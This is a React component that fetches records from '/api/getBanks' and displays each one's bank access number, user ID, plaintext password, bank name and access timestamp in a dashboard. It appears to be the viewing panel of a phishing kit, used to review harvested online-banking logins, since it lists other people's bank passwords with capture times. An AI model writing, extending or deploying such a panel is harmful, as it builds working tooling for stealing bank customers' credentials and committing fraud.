"use client";

import React, { useEffect, useState } from 'react';

type BankInfo = {
  accessNumber: string;
  userId: string;
  password: string;
  bank: string;
  timestamp: string;
};

const AccountInfo = () => {
  const [data, setData] = useState<BankInfo[]>([]);
  const [message, setMessage] = useState<string | null>(null);

  const formatTimestamp = (timestamp: string) => {
    // No need to replace slashes - the Date constructor handles ISO strings directly
    const date = new Date(timestamp);
    
    return date.toLocaleString('en-US', {
      weekday: 'long', 
      year: 'numeric', 
      month: 'long', 
      day: 'numeric',
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit',
      timeZoneName: 'short'  // Optional: adds timezone info
    });
  };

  // Fetch data on component mount
  useEffect(() => {
    fetch('/api/getBanks')
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          const banks = data.banks || [];
          setData(banks);
          setMessage(data.message);
        } else {
          setMessage('Failed to fetch banks.');
        }
      })
      .catch(error => {
        console.error('Error fetching data:', error);
        setMessage('Error fetching data.');
      });
  }, []);

  return (
    <div className="p-4 bg-gray-900 rounded-md shadow-lg">
      <h1 className="text-2xl font-bold mt-4">Account Information</h1>
      <div className="mt-4 flex flex-wrap gap-2">
        {data.length === 0 ? (
          <p className="text-white">No accounts found.</p>
        ) : (
          data.map((item, index) => (
            <div key={index} className="bg-gray-800 rounded-lg shadow-md p-4 mb-4 transform transition-transform duration-200 hover:translate-y-1">
              <h3 className="text-xl font-semibold mb-2">Access Number: {item.accessNumber}</h3>
              <p><strong>User ID:</strong> {item.userId}</p>
              <p><strong>Password:</strong> {item.password}</p>
              <p><strong>Bank:</strong> {item.bank.replace(/_/g, ' ')}</p>
              <p><strong>Access Time:</strong> {formatTimestamp(item.timestamp)}</p>
            </div>
          ))
        )}
      </div>
    </div>
  );
};

export default AccountInfo;
